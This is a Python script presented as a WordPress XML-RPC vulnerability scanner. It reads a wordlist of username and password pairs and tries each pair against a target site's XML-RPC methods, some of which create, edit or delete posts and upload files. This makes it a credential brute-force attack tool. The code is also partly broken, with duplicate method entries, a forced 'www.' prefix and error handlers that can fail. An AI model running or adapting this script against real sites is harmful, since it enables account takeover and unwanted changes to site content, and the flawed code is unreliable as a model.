import argparse
import xmlrpc.client

# Parse command line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="WordPress XMLRPC Vulnerability Scanner")
    parser.add_argument("-u", "--url", dest="url", help="URL of the targeted site", required=True)
    parser.add_argument("-w", "--wordlist", dest="wordlist", help="Path to the wordlist file containing usernames and passwords separated by a space", required=True)
    return parser.parse_args()

def main():
    # Get command line arguments and set up XMLRPC server object
    args = parse_args()
    url = f"https://www.{args.url}/xmlrpc.php"
    server = xmlrpc.client.Server(url)

    # Define list of methods to check for authentication
    authenticated_methods = [
        "wp.getUsersBlogs",
        "wp.getUsers",
        "wp.getProfile",
        "wp.getAuthors",
        "wp.getComments",
        "wp.getPageTemplates",
        "wp.getTaxonomies",
        "wp.getTerms",
        "wp.getPostFormats",
        "wp.getPostStatuses",
        "wp.getPostTypes",
        "wp.newCategory",
        "wp.newComment",
        "wp.newPage",
        "wp.newPost",
        "wp.editComment",
        "wp.editPage",
        "wp.editPost",
        "wp.deleteComment",
        "wp.deletePage",
        "wp.deletePost",
        "wp.getCommentCount",
        "wp.getPageList",
        "wp.getPost",
        "wp.getPage",
        "wp.getPost",
        "wp.getPage",
        "wp.getRecentPosts",
        "wp.getTags",
        "wp.getTerm",
        "wp.getTermsBy",
        "wp.getMediaItem",
        "wp.getMediaLibrary",
        "wp.getMediaItemMimeType",
        "wp.uploadFile",
        "pingback.ping",
        "system.multicall"
    ]

    # Check if XMLRPC is enabled
    try:
        server.system.listMethods()
    except xmlrpc.client.ProtocolError as err:
        if err.errcode == 405:
            print("XMLRPC is disabled.")
            return
        else:
            raise

    # Get methods allowed by the server and check intersection with the authenticated_methods list
    allowed_methods = set(server.system.listMethods())
    authenticated_set = set(authenticated_methods)
    intersection = allowed_methods.intersection(authenticated_set)

    if len(intersection) == 0:
        print("No methods for authentication available.")
        return

    # Test methods for authentication
    with open(args.wordlist, 'r') as f:
        for line in f:
            try:
                # Try to authenticate to method with credentials from wordlist file
                username, password = line.strip().split()
                for method in intersection:
                    getattr(server, method)("1", username, password)
                    print(f"{method} allows authentication with {username}:{password}")
            except xmlrpc.client.Fault as err:
                # If authentication fails with 405 error, print message indicating disabled authentication
                if err.faultCode == 405:
                    print(f"{method} authentication disabled for {username}:{password}")
                else:
                    # Otherwise, print message indicating authentication failed
                    print(f"{method} authentication failed for {username}:{password}")
            except:
                # Handle any other unexpected errors that may occur during authentication
                print(f"An unexpected error occurred while testing credentials: {username}:{password}")

if __name__ == "__main__":
    main()
